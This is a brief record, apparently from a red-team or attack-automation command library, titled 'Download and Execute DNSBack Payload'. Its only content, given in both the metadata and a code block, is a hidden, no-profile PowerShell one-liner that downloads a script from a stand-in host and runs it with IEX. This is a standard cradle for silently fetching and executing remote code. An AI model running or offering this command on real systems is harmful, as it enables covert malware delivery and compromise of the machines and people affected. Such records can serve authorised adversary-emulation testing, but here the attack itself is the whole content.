---
id: 96c6ac7d-918e-4bea-a204-4dc9a418c7ea
name: Download and Execute DNSBack Payload
type: command
executor: bash
data: $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))"
output: null
created_at: '2023-04-06T03:56:16.220867+00:00'
updated_at: '2023-04-10T20:36:21.830055+00:00'
---

# Download and Execute DNSBack Payload

```bash
$ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))"
```
